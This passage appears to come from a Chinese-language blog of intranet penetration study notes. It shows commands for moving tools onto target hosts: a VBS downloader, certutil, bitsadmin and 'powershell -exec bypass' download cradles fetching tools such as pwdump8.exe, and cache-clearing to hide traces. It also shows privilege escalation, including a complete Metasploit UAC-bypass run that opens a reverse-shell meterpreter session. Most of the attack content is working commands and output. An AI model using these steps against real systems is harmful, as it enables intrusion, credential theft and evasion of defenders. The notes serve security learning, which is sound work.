Post.Send()
Set aGet &#x3D; CreateObject(&quot;ADODB.Stream&quot;)
aGet.Mode &#x3D; 3
aGet.Type &#x3D; 1
aGet.Open()
aGet.Write(Post.responseBody)
aGet.SaveToFile &quot;C: test\target.exe&quot;,2
#通过如下命令执行 download.vbs，即可实现下载target.exe文件的操作
Cscript download.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>先将需要上传的EXE文件转换为十六进制HEX的形式，再将HEX代码写入文件，最后将HEX代码还原成EXE文件。本质思想是：<mark>文件 --&gt; 编码 --&gt; 复制/上传到目标机器  --&gt; 解码 --&gt; 文件</mark>。使用这种思路可以在内网中绕过无法上传文件限制，下面简单举个例子</li>
</ul>
<p>假设这样一个场景，目标不出网且不允许上传文件但是可以复制文本，可以通过 PowerShell 将 exe 可执行文件编码成 base64 文本，将编码后的内容复制到目标主机后，再将 base64 文本转换成 exe 可执行文件</p>
<pre class="line-numbers language-none"><code class="language-none">#使用 PowerShell 进行 base64 编码
$PEBytes &#x3D; [System.IO.File]::ReadAllBytes(&quot;fscan.exe&quot;)
$Base64Payload &#x3D; [System.Convert]::ToBase64String($PEBytes)
Set-Content fscan_base64.txt -Value $Base64Payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用 PowerShell 进行 base64 解码</p>
<pre class="line-numbers language-none"><code class="language-none">$Base64Bytes &#x3D; Get-Content (&quot;fscan_base64.txt&quot;)
$PEBytes&#x3D; [System.Convert]::FromBase64String($Base64Bytes)
[System.IO.File]::WriteAllBytes(&quot;fscan_base64.exe&quot;,$PEBytes)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108124903534.png" alt="image-20231108124903534"></p>
<p><mark>自 Windows 7 开始，Windows 自带了 CertUtil 命令</mark>，可以使用 CertUtil 进行 MD5、SHA1 等算法的计算，也可以使用 CertUtil 进行 base64 的编码，使用起来要比 PowerShell 方便不少。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108125440288.png" alt="image-20231108125440288"></p>
<pre class="line-numbers language-none"><code class="language-none">#使用 CertUtil 进行base64编码
CertUtil -encode fscan.exe fscan_base64.txt
#使用 CertUtil 进行base64解码
CertUtil -decode fscan_base64.txt fscan_base64.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108125529136.png" alt="image-20231108125529136"></p>
<ul>
<li>使用 Certutil下载</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">certutil -urlcache -split -f  http:&#x2F;&#x2F;www.baidu.com&#x2F;1.rar 
#certutil -urlcache -split -f  http:&#x2F;&#x2F;192.168.3.61:8000&#x2F;test.txt
#certutil -urlcache -split -f  http:&#x2F;&#x2F;192.168.3.61:8000&#x2F;test.txt C:\test.txt

#注意Certutil是以URL缓存模式下载文件的，下载完后注意清除缓存记录
#查看利用certUtil下载文件的缓存记录
certutil.exe -urlcache *
#删除缓存记录
#方法一：默认在缓存目录位置：%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content保存下载的文件副本，直接删除缓存目录对应文件即可
#方法二：certutil.exe -urlcache * delete
#如果要删除指定URL的缓存记录，可以键入：certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.3.61:8000&#x2F;test.txt delete

#计算文件hash
#SHA1
certutil.exe -hashfile msg.dll
#SHA256
certutil.exe -hashfile msg.dll SHA256
#MD5
certutil.exe -hashfile msg.dll MD5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108125216206.png" alt="image-20231108125216206"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108125739423.png" alt="image-20231108125739423"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108125747753.png" alt="image-20231108125747753"></p>
<ul>
<li>利用bitsadmin下载</li>
</ul>
<p>bitsadmin是一个命令行工具，Windows XP以后版本的Windows操作系统中自带该工具(Windows Update程序就是用它来下载文件的)。推荐在Windows 7和Windows 8主机上使用bitsadmin</p>
<p><mark>bitsadmin通常用于创建下载和上传进程并监测其进展。bitsadmin使用后台智能传输服务(BITS)，该服务主要用于Windows操作系统的升级、自动更新等，工作方式为异步下载文件在同步下载文件时也有优异的表现)</mark>。</p>
<p>bitsadmin使用Windows的更新机制，并利用IE的代理机制。如果渗透测试的目标主机使用了网站代理，并且需要活动目录证书，那么 bitsadmin 可以帮助解决下载文件的问题。</p>
<pre class="line-numbers language-none"><code class="language-none">bitsadmin &#x2F;rawreturn &#x2F;transfer getfile http:&#x2F;&#x2F;download.sysinternals.com&#x2F;files&#x2F;PSTools.zip c:\p.zip
#bitsadmin &#x2F;rawreturn &#x2F;transfer getfile http:&#x2F;&#x2F;192.168.3.61:8000&#x2F;test.txt c:\test.txt
或
bitsadmin &#x2F;transfer myDownLoadJob &#x2F;download &#x2F;priority normal &quot;http:&#x2F;&#x2F;download.sysinternals.com&#x2F;files&#x2F;PSTools.zip&quot; &quot;c:\p.zip&quot;
#bitsadmin &#x2F;transfer myDownLoadJob &#x2F;download &#x2F;priority normal &quot;http:&#x2F;&#x2F;192.168.3.61:8000&#x2F;test.txt&quot; &quot;c:\test.txt&quot;
#注意使用绝对路径，尽量不要使用相对路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108104612223.png" alt="image-20231108104612223"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108103528855.png" alt="image-20231108103528855"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108104842309.png" alt="image-20231108104842309"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108104924553.png" alt="image-20231108104924553"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108104941470.png" alt="image-20231108104941470"></p>
<ul>
<li>利用PowerShell下载</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;ip:port&#x2F;pwdump8.exe&#39;,&#39;c:&#x2F;pwdump8.exe&#39;)

powershell -exec bypass -c &quot;Invoke-WebRequest -Uri &#39;http:&#x2F;&#x2F;122.152.227.248:8000&#x2F;test.txt&#39; -OutFile &#39;.&#x2F;test.txt&#39;&quot;

powershell -exec bypass -c &quot;Start-BitsTransfer -Source &#39;http:&#x2F;&#x2F;122.152.227.248:8000&#x2F;test.txt&#39; -Destination &#39;.&#x2F;test.txt&#39;&quot;

powershell -exec bypass -c &quot;Invoke-RestMethod -Uri &#39;http:&#x2F;&#x2F;122.152.227.248:8000&#x2F;test.txt&#39; -OutFile &#39;.&#x2F;test.txt&#39;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="突破内网禁止上传大文件">突破内网禁止上传大文件</h3>
<p>在内网中，有时偶尔会因为种种限制，导致无法上传大文件，以至于只能上传小文件。</p>
<p>比如这样一个场景，当时在拿下目标 shell 后发现只能上传几百 K 的小文件，文件稍微大些比如几 M 的文件就会提示上传失败</p>
<p>针对这种情况，就需要将大文件变成小文件后再进行上传，一般来说有下面两种途径</p>
<ul>
<li>常规的压缩文件</li>
<li>分割文件</li>
</ul>
<h4 id="压缩文件">压缩文件</h4>
<p>这里使用7z做演示，7-Zip 文件下载地址：<a target="_blank" rel="noopener" href="https://www.7-zip.org/">https://www.7-zip.org/</a></p>
<p>7z常用参数</p>
<pre class="line-numbers language-none"><code class="language-none">a     添加压缩文件
x     解压压缩文件
-p    指定密码
-v    分卷压缩
-r    递归压缩
-o    指定输出目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>普通的压缩/解压文件</p>
<pre class="line-numbers language-none"><code class="language-none">#把 fscan.exe 压缩成 fscan.7z，压缩密码为teamssix.com
7z.exe a -pteamssix.com fscan.7z fscan.exe
#把 fscan.7z 解压成 fscan.exe
7z.exe x -pteamssix.com fscan.7z<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>分卷压缩/解压文件</p>
<pre class="line-numbers language-none"><code class="language-none">#分卷压缩其实和下面介绍的分割文件有点类似，区别还是在于一个对文件进行了压缩，一个没有进行压缩。
#把 fscan.exe 以 500 K 大小进行分卷压缩。
7z.exe a -pteamssix.com -v500k fscan.7z fscan.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108155902719.png" alt="image-20231108155902719"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108160008651.png" alt="image-20231108160008651"></p>
<pre class="line-numbers language-none"><code class="language-none">#把 fscan.7z 解压成 fscan.exe
7z.exe x -pteamssix.com fscan.7z.001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108161129524.png" alt="image-20231108161129524"></p>
<p>可以看到，使用分卷压缩可以把一个大文件分成多个小文件，然后将小文件上传上去后，再进行解压就可以了。如果目标主机没有安装 7-Zip，可以先在自己的主机上安装 7-Zip，然后把安装目录下的 7z.exe上传到目标主机上，默认路径为C:\Program Files\7-Zip\7z.exe。7z.exe 只有 400 多 K 的大小，可以说很是小巧了</p>
<h4 id="分割文件">分割文件</h4>
<p>使用 split 以 500 K 大小分割 fscan.exe 文件，split 命令在 Linux 和 MAC 下都是自带的，因此在自己的电脑上分割好后，直接上传即可。</p>
<pre class="line-numbers language-none"><code class="language-none">split -b 500k fscan.exe teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>合并分割文件为 fscan.exe</p>
<pre class="line-numbers language-none"><code class="language-none">cat teamssix* &gt; fscan			# 适用于 Linux、Mac
copy &#x2F;b teamssix* fscan.exe		# 适用于 Windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108161833547.png" alt="image-20231108161833547"></p>
<p>使用 split 分割文件是较为方便的做法，无需第三方软件，且不论目标是 Linux 还是 Windows 都能支持。</p>
<h1>权限提升分析及防御</h1>
<p>在Windows中，权限大概分为四种，分别是User、Administrator、System、TrustedInstaller在这四种权限中，我们经常接触的是前三种。第四种权限TrustedInstaller，在常规使用中通常不会涉及。</p>
<ul>
<li>User：普通用户权限，是系统中最安全的权限(因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料)</li>
<li>Administrator：管理员权限。可以利用Windows的机制将自己提升为System权限，以便操作SAM文件等</li>
<li>System：系统权限。可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到System权限才可以对散列值进行Dump操作</li>
<li>TrustedInstaller：Windows中的最高权限。对系统文件，即使拥有System权限也无法进行修改。只有拥有TrustedInstaller权限的用户才可以修改系统文件</li>
</ul>
<p>Windows操作系统中管理员账号的权限，以及Linux操作系统中root账户的权限，是操作系统的最高权限。提升权限(也称提权)的方式分为以下两类。</p>
<ul>
<li>纵向提权：低权限角色获得高权限角色的权限。例如，一个WebShell权限通过提权，拥有了管理员权限，这种提权就是纵向提权，也称作权限升级。</li>
<li>横向提权：获取同级别角色的权限。例如，在系统A中获取了系统B的权限，这种提权就属于横向提权。</li>
</ul>
<p><mark>常用的提权方法有系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、Web中间件漏洞提权、DLL劫持提权、滥用高权限令牌提权、第三方软件/服务提权等</mark>。这里着重提一下溢出漏洞，溢出漏洞就像往杯子里装水，如果水太多，杯子装不下了，就会溢出来。计算机中有个地方叫作缓存区。程序缓存区的大小是事先设置好的，如果用户输入数据的大小超过了缓存区的大小，程序就会溢出。系统内核溢出漏洞提权是一种通用的提权方法，攻击者通常可以使用该方法绕过系统的所有安全限制。攻击者利用该漏洞的关键是目标系统没有及时安装补丁，或者即使微软已经针对某个漏洞发布了补丁，但如果系统没有立即安装补丁，就会让攻击者有机可乘。然而，这种提权方法也存在一定的局限性，如果目标系统的补丁更新工作较为迅速和完整，那么攻击者要想通过这种方法提权，就必须找出目标系统中的0day漏洞</p>
<p>查询当前用户的组成员身份信息</p>
<pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;groups				#windows
groups 或者 id			#linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109101636237.png" alt="image-20231109101636237"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109101645851.png" alt="image-20231109101645851"></p>
<h2 id="发现主机缺失补丁">发现主机缺失补丁</h2>
<h3 id="手工发现缺失补丁">手工发现缺失补丁</h3>
<pre class="line-numbers language-none"><code class="language-none">systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>直接运行 systeminfo 命令，在「修补程序」（英文：Hotfix(s) ）处可以看到已安装的补丁。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108223505775.png" alt="image-20231108223505775"></p>
<p>运行以下命令，同样可以看到当前系统打补丁的情况，显示的信息比 systeminfo 更详细直观。</p>
<pre class="line-numbers language-none"><code class="language-none">wmic qfe get Caption,Description,HotfixID,InstalledOn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108223703576.png" alt="image-20231108223703576"></p>
<p>知道了系统安装了哪些补丁，也就能反推出系统可能存在的漏洞了。注意，知道安装了的补丁是不能被攻击者直接利用的。攻击者采取的利用方式通常是：寻找提权的EXP，将已安装的补丁编号与提权的EXP编号进行对比，例如KiTrap0D和KB979682、MS11-011和KB2393802、MS11-080和KB2592799、MS10-021和KB979683、MS11-080和KB2592799，然后使用没有编号的EXP进行提权。</p>
<blockquote>
<p>“WMIC”是“Windows Management Instrumentation Command-line”的缩写。WMIC是 Windows平台上最有用的命令行工具。使用 WMIC，不仅可以管理本地计算机，还可以管理同一域内的所有计算机(需要一定的权限 )，而且在被管理的计算机上不必事先安装 WMIC。WMIC 在信息收集和后渗透测试阶段是非常实用的，可以调取和查看目标机器的进程、服务、用户、用户组、网络连接、硬盘信息、网络共享信息、已安装的补丁、启动项、已安装的软件、操作系统的相关信息和时区等。</p>
</blockquote>
<h3 id="自动发现缺失补丁">自动发现缺失补丁</h3>
<h4 id="Sherlock-脚本">Sherlock 脚本</h4>
<p>Sherlock 是一个在 Windows 下能够快速发现目标系统可能存在可被用于提权的漏洞的 PowerShell 脚本。</p>
<p>Sherlock 项目地址：<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
<pre class="line-numbers language-none"><code class="language-none">#导入脚本
Import-Module .\Sherlock.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>Sherlock 命令</p>
<pre class="line-numbers language-none"><code class="language-none">Find-ALLVulns	搜索所有未安装的补丁
Find-MS16032	搜索单个漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="Metasploit">Metasploit</h4>
<p>在已经获取到目标会话后，比如这里的会话 Seesion ID 为 1，<mark>使用 post/windows/gather/enum_patches 模块可直接查看当前系统补丁信息</mark>。</p>
<pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; use post&#x2F;windows&#x2F;gather&#x2F;enum_patches

msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; set session 1
session &#x3D;&gt; 1

msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; run
[+] KB2999226 installed on 11&#x2F;26&#x2F;2020
[+] KB976902 installed on 11&#x2F;21&#x2F;2010
[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或者使用 MSF 发现目标可用提权漏洞，然后进行提权</p>
<p>首先查看下当前会话权限</p>
<pre class="line-numbers language-none"><code class="language-none">msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; sessions 1
[*] Starting interaction with 1...

meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;
Process 3048 created.
Channel 6 created.

组信息
-----------------

组名                                   类型   SID          属性
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
BUILTIN\Administrators                 别名   S-1-5-32-544 只用于拒绝的组
BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组
控制台登录                             已知组 S-1-2-1      必需的组, 启用于默认, 启用的组
NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组
NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192  必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到当前权限为 Medium Mandatory Level，即普通权限(标准用户权限)</p>
<p>我们<mark>使用 post/multi/recon/local_exploit_suggester 模块检测下当前系统可利用的提权漏洞</mark></p>
<pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; background
[*] Backgrounding session 1...

msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester
msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; set session 1
session &#x3D;&gt; 1
msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; run

[*] 172.16.214.4 - Collecting local exploits for x86&#x2F;windows...
[*] 172.16.214.4 - 38 exploit checks are being tried...
[+] 172.16.214.4 - exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr: The target appears to be vulnerable.
[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到提示存在 exploit/windows/local/bypassuac_eventvwr 模块可被利用</p>
<pre class="line-numbers language-none"><code class="language-none">msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr
[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcp

msf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1
session &#x3D;&gt; 1

msf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; run
[*] Started reverse TCP handler on 10.101.22.38:4444
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (175174 bytes) to 172.16.214.4
[*] Meterpreter session 2 opened (10.101.22.38:4444 -&gt; 172.16.214.4:49160) at 2021-07-06 15:38:08 +0800
[*] Cleaning up registry keys ...

meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;
Process 3048 created.
Channel 1 created.

组信息
-----------------

组名                                 类型   SID          属性
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
BUILTIN\Administrators               别名   S-1-5-32-544 必需的组, 启用于默认, 启用的组, 组的所有者
BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
NT AUTHORITY\INTERACTIVE             已知组 S-1-5-4      必需的组, 启用于默认, 启用的组
控制台登录                           已知组 S-1-2-1      必需的组, 启用于默认, 启用的组
NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组
NT AUTHORITY\NTLM Authentication     已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
Mandatory Label\High Mandatory Level 标签   S-1-16-12288 必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到，使用 exploit/windows/local/bypassuac_eventvwr 模块直接将目标权限提升到了 High Mandatory Level，即管理员权限，这里可以说 MSF 很方便了。</p>
<h4 id="wesng">wesng</h4>
<p>wesng 被称为 Windows Exploit Suggester 的下一代，wesng 和 Windows Exploit Suggester 的使用方法基本一致，但 wesng 所支持的操作系统更丰富</p>
<p>wesng 的安装方法很简单，如下</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;bitsadmin&#x2F;wesng.git
cd wesng
python wes.py --update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>使用起来也很简单，直接在目标主机上运行以下命令，将 systeminfo 的信息保存到 txt 中</p>
<pre class="line-numbers language-none"><code class="language-none">systeminfo &gt; info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>直接使用 wesng 即可</p>
<pre class="line-numbers language-none"><code class="language-none">python wes.py info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231108231755579.png" alt="image-20231108231755579"></p>
<p>使用 wesng 可以直接看到目标主机可能存在的 CVE 漏洞，从而便于我们有针对性的利用这些漏洞</p>
<h2 id="系统服务权限配置不当利用">系统服务权限配置不当利用</h2>
<p>在Windows操作系统中，攻击者通常会通过系统内核溢出漏洞来提权，但如果碰到无法通过系统内核溢出漏洞提取所在服务器权限的情况，就会利用系统中的配置错误来提权。<mark>Windows操作系统中的常见配置错误包括管理员凭据配置错误、服务配置错误、故意削弱的安全措施、用户权限过高等。Windows 系统的错误配置主要可以用来进行提权操作，比如可信任服务路径漏洞、计划任务程序以高权限运行、注册表键 AlwaysInstallElevated 等。除了用来进行提权，还可以用来寻找一些敏感信息，比如在一些安装配置的文件中或许就包含了一些明文账号密码等等</mark>。</p>
<p>Windows系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件。因此，如果一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。Windows服务是以System权限运行的，因此，其文件夹、文件和注册表键值都是受强访问控制机制保护的。但是，在某些情况下，操作系统中仍然存在一些没有得到有效保护的服务。这就是系统服务权限配置错误中的可写目录漏洞，有如下两种可能：</p>
<ul>
<li>服务未运行：攻击者会使用任意服务替换原来的服务，然后重启服务</li>
<li>服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用<br>
DLL 劫持技术并尝试重启服务来提权。</li>
</ul>
<p>常见利用工具：</p>
<ul>
<li>PowerUp</li>
<li>Metasploit</li>
<li>Empire</li>
</ul>
<h3 id="可信任服务路径漏洞">可信任服务路径漏洞</h3>
<p>我在《提权手法》一文中写到过，这里简单带过</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109115258502.png" alt="image-20231109115258502"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109115309086.png" alt="image-20231109115309086"></p>
<h3 id="注册表键AlwaysInstallElevated">注册表键AlwaysInstallElevated</h3>
<p>注册表AlwaysInstallElevated是一个策略设置项。<mark>Windows允许低权限用户以SYSTEM权限运行安装文件。如果启用此策略设置项，那么任何权限的用户都能以SYSTEM权限来安装恶意的MSI（MicrosoftWindowsInstaller）文件</mark>。</p>
